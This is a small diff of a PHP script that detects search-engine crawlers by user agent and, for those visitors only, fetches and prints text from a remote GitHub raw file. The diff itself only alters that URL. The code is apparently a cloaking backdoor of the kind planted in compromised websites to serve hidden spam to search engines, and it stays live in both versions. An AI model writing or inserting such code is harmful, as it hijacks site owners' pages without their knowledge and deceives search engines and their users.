@@ -18,7 +18,7 @@ $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|
 return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://raw.githubusercontent.com/luxgopay/belalang/refs/heads/main/emergencybru.txt";
+$sky = "https://raw.githubusercontent.com/luxgopay/belalang/refs/heads/main/emergencybru.txt1";
 
 if (is_bot()) {
 echo @file_get_contents($sky);
